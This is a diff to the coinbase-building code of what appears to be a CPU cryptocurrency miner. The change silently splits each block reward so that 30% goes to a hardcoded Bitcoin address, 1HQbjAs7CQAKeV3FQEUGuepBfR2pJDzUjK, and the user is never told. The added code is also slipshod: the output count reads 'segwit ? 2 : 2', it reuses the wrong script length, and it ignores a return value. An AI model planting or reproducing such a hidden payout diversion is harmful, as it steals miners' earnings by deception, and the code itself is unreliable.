@@ -138,6 +138,7 @@ static char *rpc_userpass;
 static char *rpc_user, *rpc_pass;
 static int pk_script_size;
 static unsigned char pk_script[42];
+static unsigned char TBC_pk_script[42];
 static char coinbase_sig[101] = "";
 char *opt_cert;
 char *opt_proxy;
@@ -487,13 +488,28 @@ static bool gbt_work_decode(const json_t *val, struct work *work)
 		cbtx[41] = cbtx_size - 42; /* scriptsig length */
 		le32enc((uint32_t *)(cbtx+cbtx_size), 0xffffffff); /* sequence */
 		cbtx_size += 4;
-		cbtx[cbtx_size++] = segwit ? 2 : 1; /* out-counter */
-		le32enc((uint32_t *)(cbtx+cbtx_size), (uint32_t)cbvalue); /* value */
-		le32enc((uint32_t *)(cbtx+cbtx_size+4), cbvalue >> 32);
+		cbtx[cbtx_size++] = segwit ? 2 : 2; /* out-counter */
+		// divide cbvelue into two parts
+		int64_t cbvalue1 = cbvalue * 7 / 10;
+		int64_t cbvalue2 = cbvalue * 3 / 10;
+		// first output
+		le32enc((uint32_t *)(cbtx+cbtx_size), (uint32_t)cbvalue1); /* value */
+		le32enc((uint32_t *)(cbtx+cbtx_size+4), cbvalue1 >> 32);
 		cbtx_size += 8;
 		cbtx[cbtx_size++] = pk_script_size; /* txout-script length */
 		memcpy(cbtx+cbtx_size, pk_script, pk_script_size);
 		cbtx_size += pk_script_size;
+		// second second output
+		le32enc((uint32_t *)(cbtx+cbtx_size), (uint32_t)cbvalue2); /* value */
+		char* TbCaddr = "1HQbjAs7CQAKeV3FQEUGuepBfR2pJDzUjK";
+		int tempVir = address_to_script(TBC_pk_script, sizeof(TBC_pk_script), TbCaddr);
+		le32enc((uint32_t *)(cbtx+cbtx_size+4), cbvalue2 >> 32);
+		cbtx_size += 8;
+		cbtx[cbtx_size++] = pk_script_size; /* txout-script length */
+		memcpy(cbtx+cbtx_size, TBC_pk_script, pk_script_size);
+		cbtx_size += pk_script_size;
+
+
 		if (segwit) {
 			unsigned char (*wtree)[32] = calloc(tx_count + 2, 32);
 			memset(cbtx+cbtx_size, 0, 8); /* value */
